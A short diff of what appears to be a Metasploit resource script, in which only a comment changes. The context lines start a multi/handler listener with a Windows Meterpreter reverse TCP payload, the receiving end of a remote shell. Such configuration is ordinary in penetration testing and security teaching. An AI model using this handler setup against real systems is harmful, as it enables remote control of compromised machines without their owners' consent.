@@ -3,7 +3,7 @@
 # Modified similar script from from @mubix - awesome dude, very smart guy, check out his blog
 
 
-# Let's pick our payload
+# Let's setup the handler pick our payload
 
 use multi/handler
 setg PAYLOAD windows/meterpreter/reverse_tcp
